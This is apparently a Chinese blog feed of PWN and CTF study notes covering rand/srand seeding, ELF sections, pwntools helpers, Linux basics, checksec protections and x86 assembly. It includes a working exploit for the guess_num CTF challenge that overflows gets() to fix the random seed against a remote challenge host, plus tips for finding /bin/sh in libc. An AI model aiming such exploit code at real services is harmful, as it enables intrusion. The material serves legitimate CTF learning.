“/bin/sh” 这个内容的地址</p><h2 id="0x003-关于rand和srand"><a href="#0x003-关于rand和srand" class="headerlink" title="0x003 关于rand和srand"></a>0x003 关于rand和srand</h2><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br><strong><em>例题：攻防世界guess_num</em></strong></p><p><img src="/images/zj21.png" alt="zj21"></p><p><img src="/images/zj22.png" alt="zj22"></p><p><img src="/images/zj23.png" alt="zj23"></p><p>gets的输出漏洞，v6是一个随机数，后面有一个判断，如果v4能与v6相等，那么就能拿到flag，而正好我们可以通过gets输出漏洞控制seed[0]让它每次产生的随机数都能被我们预知</p><h5 id="关于ctype库与dll"><a href="#关于ctype库与dll" class="headerlink" title="关于ctype库与dll"></a>关于ctype库与dll</h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p><h5 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h5><p>可以使用ldd查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure><p>也可以在脚本中通过elf文件查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):      #循环写法（循环10次）</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x004-text-data-bss等的区别"><a href="#0x004-text-data-bss等的区别" class="headerlink" title="0x004 .text .data .bss等的区别"></a>0x004 .text .data .bss等的区别</h2><p> 原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p><h2 id="0x005-p32（64）与u32（64）的区别"><a href="#0x005-p32（64）与u32（64）的区别" class="headerlink" title="0x005 p32（64）与u32（64）的区别"></a>0x005 p32（64）与u32（64）的区别</h2><p>p32是人发给机器</p><p>u32是机器发给机器</p><h2 id="0x006-p-recv-4-与p-recv-4-的区别"><a href="#0x006-p-recv-4-与p-recv-4-的区别" class="headerlink" title="0x006 p.recv(4)与p.recv()[:4]的区别"></a>0x006 p.recv(4)与p.recv()[:4]的区别</h2><p>p.recv(4)表示接受字符数为4</p><p>p.recv()[:4]表示接收到第四个字符</p><p>p.recv()[2:4]表示从第二个字符接收到第四个字符</p><p>p.recv()[:-1]表示一直接收</p><p>p.recvuntil(\n)[:-1]代表接收除去\n的所有数</p><h2 id="0x007"><a href="#0x007" class="headerlink" title="0x007"></a>0x007</h2><p>str()将括号内的东西打包成字符串</p><p>int( ,16)将括号内东西打包成16进制数</p><h2 id="0x008-寄存器与偏移地址"><a href="#0x008-寄存器与偏移地址" class="headerlink" title="0x008 寄存器与偏移地址"></a>0x008 寄存器与偏移地址</h2><p><strong>什么是寄存器？</strong></p><p>给有特定功能的内存单元取一个别名，这个别名就是我们经常说的寄存器。</p><p><strong>什么是寄存器映射？</strong></p><p>给存储器分配地址的过程叫存储器映射，再分配一个地址叫重映射。</p><p><strong>什么是偏移地址？</strong></p><p>偏移地址是计算机里的内存分段后，在段内某一地址相对于段首地址（段地址）的偏移量。偏移地址也成为偏移量</p><p>有效地址 = 基地址 + 偏移地址</p><h2 id="0x009-readelf"><a href="#0x009-readelf" class="headerlink" title="0x009 readelf"></a>0x009 readelf</h2><p>用于解析ELF格式目标文件的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc_32.so.6|grep 函数名</span><br></pre></td></tr></table></figure><p>可查找函数在libc中的地址</p><p>不同的 ”-x“会有不同的用法</p><h2 id="0x010-strings"><a href="#0x010-strings" class="headerlink" title="0x010 strings"></a>0x010 strings</h2><p>用于在二进制文件中（ELF）查找可打印的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -at x libc_32.so.6|grep &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>可查找”/bin/sh“的地址</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA</title>
      <link href="/2021/01/26/IDA/"/>
      <url>/2021/01/26/IDA/</url>
      
        <content type="html"><![CDATA[<p> 原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><h1 id="text-data-bss等的区别"><a href="#text-data-bss等的区别" class="headerlink" title=".text .data .bss等的区别"></a>.text .data .bss等的区别</h1><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基本操作</title>
      <link href="/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p> 原博客：<a href="https://blog.csdn.net/qq_41923771/article/details/81452529">https://blog.csdn.net/qq_41923771/article/details/81452529</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/78814422">https://blog.csdn.net/niexinming/article/details/78814422</a></p><h1 id="什么是Linux"><a href="#什么是Linux" class="headerlink" title="什么是Linux"></a>什么是Linux</h1><p>Linux在操作使用中时通过 输入命令——shell解释——内核处理</p><p>Linux的内核一般包含五大部分：进程管理、存储管理、文件管理、设备管理和网络管理，是一组程序模块，具有访问硬件设备和所有主存空间的权限，是仅有的能够执行特权指令的程序。主要功能是：资源抽象、资源分配、资源共享。（相当于Linux的核心所在）</p><p>shell作用：</p><p>内核是 如何对资源进行合理的分配 和 如何对用户需要作出处理 ，</p><p>1.所有的要执行的进程都要和shell建立连接，shell相当于Linux内核和外界沟通的唯一途径，shell通过分析所有进程的重要性来对各个进程的先后顺序进行合理化分配，从而使得系统更加高效</p><p>2.当客户对内核发出指令时，shell将会将客户所发出的指令进行类似翻译后告诉内核，内核在执行相应的命令</p><p>3.shell在流程中也起到了对内核作保护的作用，将外界指令的安全性进行了处理，内核只需要执行shell传出来的指令即可，增加了工作效率</p><hr><h1 id="Linux常用基础指令"><a href="#Linux常用基础指令" class="headerlink" title="Linux常用基础指令"></a>Linux常用基础指令</h1><h2 id="1-命令行行提示符含义："><a href="#1-命令行行提示符含义：" class="headerlink" title="1.命令行行提示符含义："></a>1.命令行行提示符含义：</h2><p><img src="https://img-blog.csdn.net/20180806141908806?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="a"></p><p>kiosk:                       用户名称（root则表示为超级用户）</p><p>@：                          分隔符</p><p>foundation31：     主机名称</p><p>~:                              当前所在系统目录（输入pwd，可以显示当先目录，～为默认， 如果切换目录则会相应的改                                 变）</p><h2 id="2-超级用户登录"><a href="#2-超级用户登录" class="headerlink" title="2.超级用户登录"></a>2.超级用户登录</h2><p>在命令行输入 su</p><p>再输入密码，登陆成功后命令提示符将会改变为root用户，身份提示符变为#</p><p><img src="https://img-blog.csdn.net/20180806143127448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="b"></p><h2 id="3-Linux系统结构"><a href="#3-Linux系统结构" class="headerlink" title="3.Linux系统结构"></a>3.Linux系统结构</h2><p><img src="https://img-blog.csdn.net/2018080712321854?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>系统目录各个文件夹介绍：</p><p> /bin     ##二进制文件，系统常规命令<br> /boot     ##系统启动分区，系统启动时读取的文件<br> /dev     ##设备文件<br> /etc     ##大多数配置文件<br> /home     ##普通用户的家目录<br> /lib     ##32位函数库<br> /lib64     ##64位库<br> /media     ##手动临时挂载点<br> /mnt     ##手动临时挂载点<br> /opt     ##第三方软件安装位置<br> /proc     ##进程信息及硬件信息<br> /root     ##超级用户家目录<br> /run     ##临时设备的默认挂载点<br> /sbin     ##系统管理命令<br> /srv     ##数据<br> /var     ##数据<br> /sys     ##内核相关信息<br> /tmp     ##临时文件<br> /usr     ##用户相关设定</p><h2 id="4-Linux下的文件管理"><a href="#4-Linux下的文件管理" class="headerlink" title="4.Linux下的文件管理"></a>4.Linux下的文件管理</h2><h3 id="1-建立空白文件"><a href="#1-建立空白文件" class="headerlink" title="1.建立空白文件"></a>1.建立空白文件</h3><p>touch file                建立空文件，或修改文件的时间戳<br>touch file1 file2     建立多个文件（file1 file2）</p><p><img src="https://img-blog.csdn.net/20180807123424400?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3 id="2：建立文件夹"><a href="#2：建立文件夹" class="headerlink" title="2：建立文件夹"></a>2：建立文件夹</h3><p>mkdir        ##建立单目录<br>mkdir -p   ##建立多层目录</p><p>eg：mkdir -p 123/456/789   在Desktop中创建123文件夹，在123中创建456文件夹，在456中创建789文件夹</p><p>实现了文件夹的多级目录创建</p><p><img src="https://img-blog.csdn.net/20180807123521110?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3 id="3：文件夹的删除"><a href="#3：文件夹的删除" class="headerlink" title="3：文件夹的删除"></a>3：文件夹的删除</h3><p>rm file           删除file文件夹，但是会提示是否删除，选择yes或者no</p><p>rm  -f file      强行删除文件不提示<br>rm  -fr file    删除当前目录下的所有文件,这个命令很危险，应避免使用。<br>                     所删除的文件，一般都不能恢复！</p><p><img src="https://img-blog.csdn.net/20180807123902711?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3 id="4-文件的编辑"><a href="#4-文件的编辑" class="headerlink" title="4:文件的编辑"></a>4:文件的编辑</h3><p><strong>step1</strong>:  vim file        进入file文件编译</p><p><img src="https://img-blog.csdn.net/20180807124020324?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step2</strong>: 进入文件后输入&lt; I &gt;进入文件输入模式，可以向文件中输入内容</p><p><img src="https://img-blog.csdn.net/20180807124144112?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step3</strong>：退出编译模式</p><p>按<esc>退出插入编译模式，进入浏览模式</p><p><strong>step4</strong>：文件的退出</p><p>在浏览模式下输入：</p><p>:q      ##当文件没有做任何修改是可用<br>:q!     ##当文件修改但不行保存修改时可用<br>:wq   ##退出保存（一般用这个）<br>:wq!  ##当文件属于自己或用户为root时可用</p><h3 id="5-文件查看"><a href="#5-文件查看" class="headerlink" title="5.文件查看"></a>5.文件查看</h3><p>文件查看常用指令</p><p>cat file             输出文件的所有内容</p><p><img src="/images/Linux1.png" alt="Linux1"></p><p><img src="/images/Linux2.png" alt="Linux2"></p><h3 id="6-文件路径"><a href="#6-文件路径" class="headerlink" title="6.文件路径"></a>6.文件路径</h3><p><strong>相对路径</strong>：（则必须有前提条件，其实在系统底层依然是绝对路径执行，只是用户看到的简略移动）</p><p>   文件相对当前系统位置的一个名称简写<br>   文件名称省略了当前路径的值<br>   只有当前在此目录中时可以使用<br>   文件名称不以/开头<br>   文件名称会自动在字符前加入’pwd’显示的路径</p><p><strong>绝对路径</strong>：</p><p> 是文件在系统中真实的位置<br> 任何时间都可以精确表示一个文件的名称<br> 文件名称以/开头</p><p>pwd           显示当前工作目录<br> cd              切换当前工作目录<br> cd /mnt    切换到/mnt目录中<br> cd -           进入当前目录之前所在目录中</p><p> ls               查看文件夹里的所有文件</p><p><strong>绝对路径和相对路径补充</strong>：</p><p><img src="/images/Linux3.png" alt="Linux3"></p><h2 id="5-常用指令合集"><a href="#5-常用指令合集" class="headerlink" title="5.常用指令合集"></a>5.常用指令合集</h2><p>标准格式：命令名称  [命令参数]  [命令对象]</p><p> ls              列出文件信息</p><p> cd            切换工作目录</p><p>pwd         显示当前目录</p><p>cp             复制</p><p>rm            删除</p><p>nc             建立TCP/UDP链接并监听</p><p>su             切换到超级用户</p><p>touch       创建文件</p><p>mkdir       创建目录</p><hr><h1 id="Linux-amp-PWN"><a href="#Linux-amp-PWN" class="headerlink" title="Linux&amp;PWN"></a>Linux&amp;PWN</h1><h2 id="PWN是什么"><a href="#PWN是什么" class="headerlink" title="PWN是什么"></a>PWN是什么</h2><p>在安全领域中指的是通过二进制/系统调用等方式获得目标主机的shell</p><h2 id="0x01-Linux下的pwn常用到的工具："><a href="#0x01-Linux下的pwn常用到的工具：" class="headerlink" title="0x01 Linux下的pwn常用到的工具："></a>0x01 Linux下的pwn常用到的工具：</h2><p> （1）gdb：Linux调试中必要用到的<br> （2）gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211">http://blog.csdn.net/gatieme/article/details/63254211</a><br> （3）pwntools:写exp和poc的利器<br> （4）checksec：可以很方便的知道elf程序的安全性和程序的运行平台<br> （5）objdump和readelf：可以很快的知道elf程序中的关键信息<br> （6）ida pro ：强大的反编译工具<br> （7）ROPgadget：强大的rop利用工具<br> （8）one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置<br> （9）libc-database： 可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本 </p><h2 id="0x02-检测elf的安全性"><a href="#0x02-检测elf的安全性" class="headerlink" title="0x02 检测elf的安全性"></a>0x02 检测elf的安全性</h2><p>拿到efl，首先要用checksec来检测elf运行于哪个平台，开启了什么安全措施，如果用gcc的编译后，默认会开启所有的安全措施。 </p><p> 【1】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们<strong>无法修改got表</strong><br> 【2】Stack：如果栈中开启Canary found，那么就<strong>不能用直接用溢出的方法覆盖栈中返回地址</strong>，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br> 【3】NX：NX enabled如果这个保护开启就是意味着<strong>栈中数据没有执行权限</strong>，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br> 【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着<strong>程序每次运行的时候地址都会变化</strong>，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p><p> 【5】 Arch: 查看操作数</p><p><img src="/images/Linux4.png" alt="Linux4"></p><h2 id="0x03-调试技巧"><a href="#0x03-调试技巧" class="headerlink" title="0x03 调试技巧"></a>0x03 调试技巧</h2><p>gdb常用的调试指令：<br> n： 执行一行源代码但不进入函数内部<br> <strong>ni: 执行一行汇编代码但不进入函数内部</strong><br> s： 执行一行源代码而且进入函数内部<br> <strong>si: 执行一行汇编代码而且进入函数内部</strong><br> c: 继续执行到下一个断点<br> *<em>b <em>地址: 下断点</em></em><br> directory+源码所在目录：加载程序源码<br> set follow-fork-mode parent ：只调试主进程<br> stack: 显示栈信息<br> x ： 按十六进制格式显示内存数据，其中x/{字节数}x 以16进制显示指定地址处的数据;{字节数}表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节） 【x/40wx表示查看40个地址中的内存数据】</p><p>代码实现：</p><p>程序没有开启地址随机化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def debug(addr):</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    gdb.attach(r, &quot;b *&quot; + addr)</span><br></pre></td></tr></table></figure><p>在程序运行时调用这个函数就可以调试了 </p><p><img src="/images/Linux5.png" alt="Linux5"></p><p>程序开启地址随机化：(看不懂。。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">wordSz &#x3D; 4</span><br><span class="line">hwordSz &#x3D; 2</span><br><span class="line">bits &#x3D; 32</span><br><span class="line">PIE &#x3D; 0</span><br><span class="line">mypid&#x3D;0</span><br><span class="line">def leak(address, size):</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">      mem.seek(address)</span><br><span class="line">      return mem.read(size)</span><br><span class="line"></span><br><span class="line">def findModuleBase(pid, mem):</span><br><span class="line">   name &#x3D; os.readlink(&#39;&#x2F;proc&#x2F;%s&#x2F;exe&#39; % pid)</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;maps&#39; % pid) as maps:</span><br><span class="line">      for line in maps:</span><br><span class="line">         if name in line:</span><br><span class="line">            addr &#x3D; int(line.split(&#39;-&#39;)[0], 16)</span><br><span class="line">            mem.seek(addr)</span><br><span class="line">            if mem.read(4) &#x3D;&#x3D; &quot;\x7fELF&quot;:</span><br><span class="line">               bitFormat &#x3D; u8(leak(addr + 4, 1))</span><br><span class="line">               if bitFormat &#x3D;&#x3D; 2:</span><br><span class="line">                  global wordSz</span><br><span class="line">                  global hwordSz</span><br><span class="line">                  global bits</span><br><span class="line">                  wordSz &#x3D; 8</span><br><span class="line">                  hwordSz &#x3D; 4</span><br><span class="line">                  bits &#x3D; 64</span><br><span class="line">               return addr</span><br><span class="line">   log.failure(&quot;Module&#39;s base address not found.&quot;)</span><br><span class="line">   sys.exit(1)</span><br><span class="line"></span><br><span class="line">def debug(addr &#x3D; 0):</span><br><span class="line">    global mypid</span><br><span class="line">    mypid &#x3D; proc.pidof(r)[0]</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">        moduleBase &#x3D; findModuleBase(mypid, mem)</span><br><span class="line">        gdb.attach(r, &quot;set follow-fork-mode parent\nb *&quot; + hex(moduleBase+addr))</span><br></pre></td></tr></table></figure><p>由于开启地址随机化之后ida pro打开程序后，显示的是程序的偏移地址，而不是实际的地址，当程序加载后程序的程序的实际地址是：基地址+偏移地址，调用debug函数的时候只要把偏移地址传递进去就好 </p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础总结</title>
      <link href="/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="CPU架构与指令集"><a href="#CPU架构与指令集" class="headerlink" title="CPU架构与指令集"></a>CPU架构与指令集</h1><p><strong>CPU</strong>：从内存中读取指令，再解码和执行</p><p><strong>指令集</strong>：操作码+特定CPU执行的基本命令；一堆二进制数据；分为CISC与RISC两种</p><p><strong>汇编、指令集之间的关系</strong>：</p><p>​    二进制数据不利于阅读与理解，于是汇编语言诞生，每条汇编指令都有对应的指令</p><h2 id="CISC与RISC对比"><a href="#CISC与RISC对比" class="headerlink" title="CISC与RISC对比"></a>CISC与RISC对比</h2><p><strong>CISC（x86）</strong>  ：指令长度不固定（1~6字节【32位】）；指令数量相对更多（说白了更讲究）；寻址方式多样；                            通用寄存器更少；</p><p>​                            缺点：反编译会指令错位；</p><p><strong>RISC（ARM）</strong>：指令长度固定（4字节【32位】）；指令数量相对较少需要组合（没那么讲究）；寻址方式单                            一；通用寄存器更多；</p><p>​                            优点：有利于解码和优化，可以实现流水线；</p><p>​                            缺点：平均代码更长，占空间</p><hr><h1 id="x86-x64-汇编基础"><a href="#x86-x64-汇编基础" class="headerlink" title="x86/x64 汇编基础"></a>x86/x64 汇编基础</h1><h2 id="CPU操作模式"><a href="#CPU操作模式" class="headerlink" title="CPU操作模式"></a>CPU操作模式</h2><p><strong>保护模式</strong>：类似虚拟机；所有指令和特性都可用，但只能在分配的内存段使用</p><p><strong>实地址模式</strong>：直接访问硬件及其实际内存地址（类似于直接在cmd里操作。。。。吧？？）</p><p><strong>系统管理模式</strong>：提供电源管理或安全保护特性机制（更个性化？？）</p><h2 id="语法风格"><a href="#语法风格" class="headerlink" title="语法风格"></a>语法风格</h2><p>x86：AT&amp;T风格和Intel风格</p><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><table><thead><tr><th>操作数</th><th>可用寄存器名称</th></tr></thead><tbody><tr><td>32位</td><td>EAX、EBX、ECX、EDX、EDI、ESI、EBP、ESP、R8D~R15D</td></tr><tr><td>64位</td><td>RAX、RBX、RCX、RDX、RDI、RSI、RBP、RSP、R8~R15</td></tr></tbody></table><p>注意：64位模式下，操作数还是默认位32位，有8个通用寄存器；当给指令加上REX（寄存器扩展）前缀后，操作数才变为64位，添加8个带标号的通用寄存器（R8~R15）</p><p>64位处理器特点：</p><ol><li>64位与32位有相同的标志位状态；</li><li>64位模式下不能访问通用寄存器的高位字节（如AH、BH、CH、DH）;</li></ol><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li><p>整数：1234这种要有后缀表明是什么进制的数；</p><p>​            ABCD这种十六进制要在以字母开头的十六进制数前加0表示，如0ABCDh；</p></li><li><p>浮点数：以十进制表示；以十六进制编码</p></li><li><p>字符串常量：允许字符串常量的嵌套（如 ‘he says “hello”‘）;在内存中以整数字节序列保存</p></li></ul><h2 id="数据传送与访问"><a href="#数据传送与访问" class="headerlink" title="数据传送与访问"></a>数据传送与访问</h2><p><strong>MOV指令</strong>：MOV  EAX,ECX  表示将ECX寄存器的值拷贝进EAX (第一个参数为目的操作数，第二个参数为源操作数)</p><p>​    如果出现小操作数（32）扩展为大操作数（64）的情况，需要对操作数进行全零扩展或符号扩展</p><p><strong>XCHG指令</strong>：交换两个操作数的值（操作数数据类型要相同）</p><p>变量名+偏移量可表示一个直接偏移量操作数（管他有没有看懂概念看例子就完事儿）</p><p>如下表示一个数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testArray BYTE 99h,98h,97h,96h</span><br><span class="line">.code</span><br><span class="line">MOV al, testArray             ; al&#x3D;99h</span><br><span class="line">MOV bl, [testArray+1]         ; bl&#x3D;98h</span><br><span class="line">MOV cl, [testArray+2]         ; cl&#x3D;97h</span><br></pre></td></tr></table></figure><h2 id="算术运算与逻辑运算"><a href="#算术运算与逻辑运算" class="headerlink" title="算术运算与逻辑运算"></a>算术运算与逻辑运算</h2><p><strong>补码</strong>：计算机底层数据都是以补码形式表示；</p><p>​            两机器数相加的补码=先求补码再相加；</p><p>​            加法运算可将符号位和数值为一起算（符号位有进位则直接舍弃）；</p><p>​            减法运算利用其相反数的加法实现；</p><p><strong>INC指令</strong>：操作数+1</p><p><strong>DEC指令</strong>：操作数-1</p><p><strong>ADD指令</strong>：将长度相同的操作数进行相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 10000h</span><br><span class="line">testData2 DWORD 20000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;10000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;30000h</span><br></pre></td></tr></table></figure><p><strong>SUB指令</strong>：从目的操作数中减去源操作数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 20000h</span><br><span class="line">testData2 DWORD 10000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;20000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;10000h</span><br></pre></td></tr></table></figure><p><strong>NEG指令</strong>：将操作数转换为二进制补码，并将符号位取反</p><h2 id="跳转指令与循环指令"><a href="#跳转指令与循环指令" class="headerlink" title="跳转指令与循环指令"></a>跳转指令与循环指令</h2><p>跳转指令类型：条件跳转和无条件跳转</p><p><strong>JMP指令</strong>：无条件跳转；需要用标号来标识，汇编时会将标号转换位相应的偏移量；标号和 JMP指令要再同一函                  数中，但全局标号不受限制。（和goto语句有点像）</p><p>​                下面程序先给EAX赋值再给EBX赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 